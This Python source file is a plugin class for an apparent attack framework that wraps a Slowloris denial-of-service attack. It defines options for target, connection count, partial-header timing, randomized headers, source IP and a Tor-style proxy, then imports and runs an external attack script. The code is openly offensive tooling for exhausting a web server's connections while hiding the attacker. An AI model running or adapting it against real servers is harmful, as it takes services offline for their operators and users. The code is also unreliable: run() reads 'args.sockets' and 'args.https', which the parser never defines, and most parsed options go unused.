"""Slowloris attack implementation"""

import argparse
import sys
import os
import netifaces
from typing import Optional, Dict, Any, List
import logging

from .base import AttackBase

logger = logging.getLogger(__name__)

class Slowloris(AttackBase):
    """Slowloris attack implementation"""
    
    name = "slowloris"
    description = "Perform Slowloris attack"
    
    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        # Target configuration
        target_group = parser.add_argument_group('Target Configuration')
        target_group.add_argument('--target', required=True, help='Target URL')
        target_group.add_argument('--port', type=int, default=80, help='Target port')
        target_group.add_argument('--ssl', action='store_true', help='Use HTTPS')
        target_group.add_argument('--path', default='/', help='Target path (default: /)')
        
        # Connection configuration
        conn_group = parser.add_argument_group('Connection Configuration')
        conn_group.add_argument('--connections', type=int, default=150, 
                               help='Number of connections to keep open')
        conn_group.add_argument('--max-sockets', type=int, help='Maximum number of sockets to open')
        conn_group.add_argument('--socket-timeout', type=float, default=30.0, 
                               help='Socket timeout (seconds)')
        conn_group.add_argument('--connection-timeout', type=float, default=5.0, 
                               help='Connection timeout (seconds)')
        conn_group.add_argument('--keep-alive', action='store_true', 
                               help='Send keep-alive headers')
        
        # Request configuration
        req_group = parser.add_argument_group('Request Configuration')
        req_group.add_argument('--user-agent', help='Custom User-Agent string')
        req_group.add_argument('--headers', help='Additional headers in JSON format')
        req_group.add_argument('--cookies', help='Cookies in JSON format')
        req_group.add_argument('--header-size', type=int, default=15, 
                             help='Size of partial header chunk in bytes')
        req_group.add_argument('--content-type', help='Content-Type header')
        
        # Network configuration
        net_group = parser.add_argument_group('Network Configuration')
        net_group.add_argument('--interface', help='Network interface to use')
        net_group.add_argument('--source-ip', help='Source IP address (random if not specified)')
        net_group.add_argument('--proxy', help='Proxy URL (e.g., socks5://127.0.0.1:9050)')
        net_group.add_argument('--dns-resolver', help='Custom DNS resolver')
        
        # Attack behavior
        behavior_group = parser.add_argument_group('Attack Behavior')
        behavior_group.add_argument('--interval', type=float, default=15.0, 
                                  help='Time interval between partial headers (seconds)')
        behavior_group.add_argument('--timeout', type=float, default=30.0, 
                                  help='Overall attack timeout (0 for no timeout)')
        behavior_group.add_argument('--ramp-up', type=int, 
                                  help='Gradually increase connections over seconds')
        behavior_group.add_argument('--random-interval', action='store_true', 
                                  help='Randomize intervals between partial headers')
        behavior_group.add_argument('--random-header', action='store_true', 
                                  help='Use random header names')
        
        # Monitoring and output
        monitor_group = parser.add_argument_group('Monitoring')
        monitor_group.add_argument('--log-file', help='Log file for connections')
        monitor_group.add_argument('--stats-interval', type=float, default=1.0, 
                                 help='Interval for printing statistics')
        monitor_group.add_argument('--verify-vuln', action='store_true', 
                                 help='Verify target vulnerability before attack')
        monitor_group.add_argument('--silent', action='store_true', 
                                 help='Suppress non-error output')
        
    def validate(self, args: argparse.Namespace) -> bool:
        # Validate target URL and configuration
        if not self.validator.validate_url(args.target):
            logger.error(f"Invalid target URL: {args.target}")
            return False
            
        if not self.validator.validate_port(args.port):
            logger.error(f"Invalid port number: {args.port}")
            return False
            
        # Validate connection parameters
        if args.connections <= 0:
            logger.error(f"Invalid connection count: {args.connections}")
            return False
            
        if args.max_sockets is not None and args.max_sockets <= 0:
            logger.error(f"Invalid max sockets: {args.max_sockets}")
            return False
            
        if args.socket_timeout <= 0:
            logger.error(f"Invalid socket timeout: {args.socket_timeout}")
            return False
            
        if args.connection_timeout <= 0:
            logger.error(f"Invalid connection timeout: {args.connection_timeout}")
            return False
            
        # Validate request configuration
        if args.header_size <= 0:
            logger.error(f"Invalid header size: {args.header_size}")
            return False
            
        if args.headers:
            try:
                import json
                headers = json.loads(args.headers)
                if not isinstance(headers, dict):
                    raise ValueError("Headers must be a JSON object")
            except Exception as e:
                logger.error(f"Invalid headers JSON: {str(e)}")
                return False
                
        if args.cookies:
            try:
                import json
                cookies = json.loads(args.cookies)
                if not isinstance(cookies, dict):
                    raise ValueError("Cookies must be a JSON object")
            except Exception as e:
                logger.error(f"Invalid cookies JSON: {str(e)}")
                return False
                
        # Validate network configuration
        if args.interface and not self.validator.validate_interface(args.interface):
            logger.error(f"Invalid interface: {args.interface}")
            return False
            
        if args.source_ip and not self.validator.validate_ip(args.source_ip):
            logger.error(f"Invalid source IP: {args.source_ip}")
            return False
            
        if args.proxy and not self.validator.validate_url(args.proxy):
            logger.error(f"Invalid proxy URL: {args.proxy}")
            return False
            
        if args.dns_resolver and not self.validator.validate_ip(args.dns_resolver):
            logger.error(f"Invalid DNS resolver: {args.dns_resolver}")
            return False
            
        # Validate timing parameters
        if args.interval <= 0:
            logger.error(f"Invalid interval: {args.interval}")
            return False
            
        if args.timeout < 0:  # 0 is valid for no timeout
            logger.error(f"Invalid timeout: {args.timeout}")
            return False
            
        if args.ramp_up is not None and args.ramp_up <= 0:
            logger.error(f"Invalid ramp-up time: {args.ramp_up}")
            return False
            
        if args.stats_interval <= 0:
            logger.error(f"Invalid statistics interval: {args.stats_interval}")
            return False
            
        return True
        
    def run(self, args: argparse.Namespace) -> None:
        # Import the original attack script
        scripts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'scripts')
        attack_path = os.path.join(scripts_dir, 'slowloris')
        
        sys.path.insert(0, attack_path)
        try:
            import slowloris as attack_script
            
            # Create attack configuration
            config = {
                'host': args.target,
                'port': args.port,
                'socket_count': args.sockets,
                'ssl': args.https,
                'proxy': args.proxy,
                'interval': args.interval
            }
            
            # Run the attack
            logger.info(f"Running Slowloris attack against {args.target}:{args.port}")
            attack_script.run_attack(config)
            
        except ImportError:
            logger.error("Failed to import Slowloris attack script")
            raise
        except Exception as e:
            logger.error(f"Attack failed: {str(e)}")
            raise
        finally:
            sys.path.remove(attack_path)
